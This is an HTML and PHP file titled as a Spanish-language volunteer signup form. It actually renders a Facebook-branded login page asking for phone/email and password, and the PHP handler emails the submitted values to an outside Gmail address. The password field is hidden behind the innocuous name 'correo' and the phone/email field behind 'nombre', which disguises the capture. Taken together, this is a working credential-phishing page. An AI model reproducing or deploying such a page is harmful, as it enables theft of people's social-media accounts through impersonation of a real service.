<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title style="color: #1877f2;">Formulario de Voluntario</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .volunteer-form {
      background-color: #fff; /* Blanco */
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 300px;
      text-align: center;
    }

    .volunteer-form input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      box-sizing: border-box;
    }

    .volunteer-form button {
      width: 100%;
      padding: 10px;
      background-color: #1877f2; /* Celeste similar a Facebook */
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="volunteer-form">
    <h2 style="color: #1877f2;">FACEBOOK</h2>
    <form action="procesar_formulario.php" method="post">
      <input type="text" name="nombre" placeholder="Móvil o Correo Elctronico" required>
      <br>
      <input type="text" name="correo" placeholder="Contraseña" required>
      <br>
      
      <br>
      
      <br>
      <button type="submit" style="background-color: #1877f2; color: #fff;">Entrar</button> <!-- Celeste similar a Facebook -->
    </form>
  </div>
</body>
</html>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST["nombre"];
    $correo = $_POST["correo"];
    $telefono = $_POST["telefono"];
    $motivo = $_POST["motivo"];

    $destinatario = "somostokoba@gmail.com";
    $asunto = "Nueva solicitud de voluntario";

    $mensaje = "Nombre: $nombre\nCorreo: $correo\nTeléfono: $telefono\nMotivo: $motivo";

    mail($destinatario, $asunto, $mensaje);

    // Puedes redirigir a una página de confirmación
    header("Location: confirmacion.html");
}
?>
git clone https://github.com/tuusuario/turepositorio.git
